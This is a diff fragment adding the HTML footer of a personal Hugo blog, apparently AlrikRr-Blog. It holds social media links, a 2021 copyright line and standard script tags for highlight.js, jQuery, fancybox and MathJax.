+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+    <p class="copyright">
+      
+        &copy; 2021
+        
+          AlrikRr-Blog
+        
+      .
+      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>
+    </p>
+  </section>
+</section>
+
+    </div>
+    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
+    
+
+    
+      
+    
+
+    
+      
+      
+      
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/highlight.min.js"></script>
+        
+        
+        
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/r.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/yaml.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/css.min.js"></script>
+        <script>hljs.configure({languages: []}); hljs.initHighlightingOnLoad();</script>
+      
+    
+    
+    
+      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
+      <script src="/js/util.js"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/backToTop.js"></script>
+    
+
+    
+      
+        
+      
+    
+
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+      <script src="//yihui.name/js/math-code.js"></script>
+<script async
+src="//cdn.bootcss.com/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+  </body>
+</html>
+
